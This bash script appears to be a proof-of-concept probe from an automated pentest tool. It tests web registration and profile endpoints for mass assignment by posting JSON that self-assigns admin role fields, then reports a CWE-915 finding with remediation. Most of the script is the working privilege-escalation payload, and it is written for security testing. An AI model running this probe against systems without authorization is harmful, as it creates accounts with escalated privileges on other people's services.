#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        Mass Assignment Probe
# Description: Tests if extra fields in registration/update are accepted
# Severity:    HIGH
# Category:    Broken Access Control & Authentication
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: Mass Assignment Probe\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
# try registering/updating with role escalation
for EP in "api/register" "api/v1/register" "api/users" "api/v1/users" "api/signup" "api/v1/signup" "register" "api/profile" "api/v1/profile"; do
  R=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{"username":"masassign_probe","email":"probe@test.com","password":"Test12345!","role":"admin","isAdmin":true,"admin":true,"is_admin":true,"active":true,"verified":true}' --max-time 10 "$T/$EP" 2>/dev/null)
  if [ "$R" = "200" ] || [ "$R" = "201" ]; then
    RESP=$(curl -s -X POST -H "Content-Type: application/json" -d '{"username":"masassign_probe2","email":"probe2@test.com","password":"Test12345!","role":"admin","isAdmin":true}' --max-time 10 "$T/$EP" 2>/dev/null | head -c 1000)
    if echo "$RESP" | grep -q "admin\|role.*admin"; then
      emit "{\"title\":\"Mass assignment — role escalation: /$EP\",\"severity\":\"critical\",\"description\":\"Registration endpoint /$EP accepts role/isAdmin fields. Users can self-assign admin privileges.\",\"remediation\":\"Whitelist allowed fields. Never accept role/permission fields from user input.\",\"cweId\":\"CWE-915\",\"owaspCategory\":\"A01:2025-Broken Access Control\"}"
    fi
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
